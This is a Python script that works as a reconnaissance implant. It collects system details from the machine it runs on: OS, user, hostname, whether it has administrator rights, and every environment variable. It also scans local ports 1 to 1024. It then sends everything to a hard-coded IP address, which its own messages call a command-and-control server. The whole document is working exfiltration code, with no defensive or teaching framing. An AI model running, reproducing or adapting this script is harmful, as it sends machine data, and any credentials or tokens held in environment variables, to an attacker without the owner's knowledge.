import platform
import os
import getpass
import socket
import psutil
import ctypes
import json
import requests

log_path = "logs.json"

os_name = platform.system()
os_version = platform.version()
architecture = platform.architecture()[0]
current_user = getpass.getuser()
hostname = platform.node()
os_release = platform.release()
uname = platform.uname()
machine = platform.machine()
processor = platform.processor()
python_version = platform.python_version()
environment_variables = os.environ

if os_name == "Windows":
    windows_version = platform.win32_ver()
else:
    windows_version = None

is_admin = False
if os_name == "Windows":
    try:
        is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        is_admin = False

target = "127.0.0.1"
open_ports = []

for port in range(1, 1025):  # scanning well-known ports first
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)  # quick timeout
    try:
        result = sock.connect_ex((target, port))
        if result == 0:
            open_ports.append(port)
    except:
        pass
    finally:
        sock.close()

# psutil listening ports
connections = psutil.net_connections()
for conn in connections:
    if conn.status == 'LISTEN':
        print(f"Port {conn.laddr.port} is open (PID {conn.pid})")

recon_data = {
    "os_name": os_name,
    "os_version": os_version,
    "os_release": os_release,
    "architecture": architecture,
    "hostname": hostname,
    "current_user": current_user,
    "machine": machine,
    "processor": processor,
    "python_version": python_version,
    "windows_version": windows_version,
    "is_admin": is_admin,
    "open_ports": open_ports,
    "env_vars": dict(environment_variables),
}

payload = {
    "recon_data": recon_data
}

print("=== System Fingerprinting ===")
print("OS Name       :", os_name)
print("OS Version    :", os_version)
print("OS Release    :", os_release)
print("Architecture  :", architecture)
print("Hostname      :", hostname)
print("Current User  :", current_user)
print("Machine Type  :", machine)
print("Processor     :", processor)
print("Python Version:", python_version)
print("Windows Ver   :", windows_version)
print("Uname         :", uname)
print("Is Admin      :", is_admin)
print("Open ports    :", open_ports)

c2_url = "http://85.215.240.40:8000/api/submit_scan/"
try:
    response = requests.post(c2_url, json=payload, timeout=5)
    if response.status_code == 200:
        print("Recon data successfully sent to C2")
    else:
        print("Failed to send recon data:", response.status_code)
except Exception as e:
    print("Error sending data to C2:", e)

with open(log_path, "w") as f:
    json.dump(payload, f, indent=4)

print(f"Payload saved to {log_path}")